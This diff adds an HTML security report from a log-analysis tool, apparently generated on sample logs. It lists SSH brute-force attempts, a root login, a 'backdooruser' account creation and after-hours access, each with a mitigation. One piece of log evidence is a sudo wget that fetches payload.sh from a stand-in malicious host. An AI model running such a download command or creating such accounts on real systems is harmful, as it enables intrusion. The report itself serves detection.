@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LogSentinel Report — 2026-05-07 23:01:38</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background: #0d1117;
+            color: #c9d1d9;
+            padding: 2rem;
+        }
+        .header {
+            border-bottom: 1px solid #30363d;
+            padding-bottom: 1.5rem;
+            margin-bottom: 2rem;
+        }
+        .header h1 {
+            font-size: 1.8rem;
+            color: #58a6ff;
+            margin-bottom: 0.3rem;
+        }
+        .header .meta { color: #8b949e; font-size: 0.9rem; }
+        .summary {
+            display: flex;
+            gap: 1rem;
+            margin-bottom: 2rem;
+            flex-wrap: wrap;
+        }
+        .stat-card {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 8px;
+            padding: 1rem 1.5rem;
+            text-align: center;
+            min-width: 120px;
+        }
+        .stat-card .number {
+            font-size: 2rem;
+            font-weight: bold;
+        }
+        .stat-card .label {
+            font-size: 0.8rem;
+            color: #8b949e;
+            text-transform: uppercase;
+        }
+        .finding {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 8px;
+            padding: 1.2rem;
+            margin-bottom: 1rem;
+        }
+        .finding-header {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            margin-bottom: 0.75rem;
+            flex-wrap: wrap;
+        }
+        .badge {
+            font-size: 0.7rem;
+            font-weight: bold;
+            padding: 2px 8px;
+            border-radius: 4px;
+            color: #000;
+        }
+        .finding-title {
+            font-weight: 600;
+            font-size: 1rem;
+            flex: 1;
+        }
+        .category {
+            font-size: 0.75rem;
+            background: #21262d;
+            padding: 2px 8px;
+            border-radius: 12px;
+            color: #8b949e;
+        }
+        .description { color: #8b949e; margin-bottom: 0.75rem; }
+        .evidence {
+            background: #0d1117;
+            border: 1px solid #21262d;
+            border-radius: 4px;
+            padding: 0.75rem;
+            margin-bottom: 0.75rem;
+            font-size: 0.85rem;
+        }
+        .evidence ul { margin-left: 1rem; }
+        .evidence li { margin: 0.3rem 0; }
+        code {
+            font-family: 'Consolas', 'Courier New', monospace;
+            color: #a5d6ff;
+            word-break: break-all;
+        }
+        .mitigation {
+            background: #1c2a1c;
+            border: 1px solid #2d4a2d;
+            border-radius: 4px;
+            padding: 0.6rem 0.75rem;
+            font-size: 0.85rem;
+            color: #7ee787;
+        }
+        .no-findings {
+            text-align: center;
+            padding: 3rem;
+            color: #7ee787;
+            font-size: 1.2rem;
+        }
+        .section-title {
+            font-size: 1.1rem;
+            color: #58a6ff;
+            margin-bottom: 1rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 1px solid #21262d;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>🔍 LogSentinel — Security Analysis Report</h1>
+        <p class="meta">Generated: 2026-05-07 23:01:38 &nbsp;|&nbsp; Total events analyzed: 13</p>
+    </div>
+
+    <div class="summary">
+        <div class="stat-card">
+            <div class="number" style="color:#ff4444">0</div>
+            <div class="label">Critical</div>
+        </div>
+        <div class="stat-card">
+            <div class="number" style="color:#ff8800">4</div>
+            <div class="label">High</div>
+        </div>
+        <div class="stat-card">
+            <div class="number" style="color:#ffcc00">1</div>
+            <div class="label">Medium</div>
+        </div>
+        <div class="stat-card">
+            <div class="number" style="color:#4499ff">0</div>
+            <div class="label">Info</div>
+        </div>
+        <div class="stat-card">
+            <div class="number" style="color:#8b949e">5</div>
+            <div class="label">Total Findings</div>
+        </div>
+    </div>
+
+    <div class="section-title">Findings</div>
+    
+                <div class="finding" style="border-left: 4px solid #ff8800">
+                    <div class="finding-header">
+                        <span class="badge" style="background:#ff8800">HIGH</span>
+                        <span class="finding-title">SSH Brute-Force Attack — 192.168.1.50</span>
+                        <span class="category">Brute Force</span>
+                    </div>
+                    <p class="description">8 failed SSH login attempts from 192.168.1.50 (threshold: 5)</p>
+                    <div class="evidence"><strong>Evidence:</strong><ul><li><code>Jan 15 02:13:01 server sshd[1234]: Failed password for admin from 192.168.1.50 port 22 ssh2</code></li><li><code>Jan 15 02:13:03 server sshd[1234]: Failed password for admin from 192.168.1.50 port 22 ssh2</code></li><li><code>Jan 15 02:13:05 server sshd[1234]: Failed password for root from 192.168.1.50 port 22 ssh2</code></li></ul></div>
+                    <div class="mitigation"><strong>💡 Mitigation:</strong> Block IP 192.168.1.50 via firewall. Consider fail2ban. Disable password auth and use SSH keys only.</div>
+                </div>
+                
+                <div class="finding" style="border-left: 4px solid #ff8800">
+                    <div class="finding-header">
+                        <span class="badge" style="background:#ff8800">HIGH</span>
+                        <span class="finding-title">Suspicious sudo command — jdoe</span>
+                        <span class="category">Suspicious Command</span>
+                    </div>
+                    <p class="description">User 'jdoe' ran a suspicious command: /usr/bin/wget http://malicious.example.com/payload.sh</p>
+                    <div class="evidence"><strong>Evidence:</strong><ul><li><code>Jan 15 09:00:01 server sudo[5678]: jdoe : TTY=pts/0 ; PWD=/home/jdoe ; USER=root ; COMMAND=/usr/bin/wget http://malicious.example.com/payload.sh</code></li></ul></div>
+                    <div class="mitigation"><strong>💡 Mitigation:</strong> Review if this command was authorized. Check for persistence mechanisms.</div>
+                </div>
+                
+                <div class="finding" style="border-left: 4px solid #ff8800">
+                    <div class="finding-header">
+                        <span class="badge" style="background:#ff8800">HIGH</span>
+                        <span class="finding-title">Direct Root Login Detected</span>
+                        <span class="category">Privilege Escalation</span>
+                    </div>
+                    <p class="description">2 direct root login(s) observed.</p>
+                    <div class="evidence"><strong>Evidence:</strong><ul><li><code>Jan 15 02:15:00 server sshd[1234]: Accepted password for root from 192.168.1.50 port 22 ssh2</code></li><li><code>Jan 15 02:15:01 server sshd[1234]: pam_unix(sshd:session): session opened for user root by (uid=0)</code></li></ul></div>
+                    <div class="mitigation"><strong>💡 Mitigation:</strong> Disable direct root SSH login (PermitRootLogin no in sshd_config). Require sudo for privilege escalation.</div>
+                </div>
+                
+                <div class="finding" style="border-left: 4px solid #ff8800">
+                    <div class="finding-header">
+                        <span class="badge" style="background:#ff8800">HIGH</span>
+                        <span class="finding-title">New User Account Created — backdooruser,</span>
+                        <span class="category">Account Activity</span>
+                    </div>
+                    <p class="description">A new user account was created: backdooruser,</p>
+                    <div class="evidence"><strong>Evidence:</strong><ul><li><code>Jan 15 11:30:00 server useradd[9999]: new user: name=backdooruser, UID=1337, GID=1337</code></li></ul></div>
+                    <div class="mitigation"><strong>💡 Mitigation:</strong> Verify this account creation was authorized. Check if the account has been added to any privileged groups.</div>
+                </div>
+                
+                <div class="finding" style="border-left: 4px solid #ffcc00">
+                    <div class="finding-header">
+                        <span class="badge" style="background:#ffcc00">MEDIUM</span>
+                        <span class="finding-title">After-Hours Login Activity (1 event(s))</span>
+                        <span class="category">Anomalous Behavior</span>
+                    </div>
+                    <p class="description">1 successful login(s) occurred between 22:00 and 06:00</p>
+                    <div class="evidence"><strong>Evidence:</strong><ul><li><code>Jan 15 02:15:00 server sshd[1234]: Accepted password for root from 192.168.1.50 port 22 ssh2</code></li></ul></div>
+                    <div class="mitigation"><strong>💡 Mitigation:</strong> Review if after-hours access is expected for these users/IPs. Consider time-based access controls.</div>
+                </div>
+                
+
+</body>
+</html>
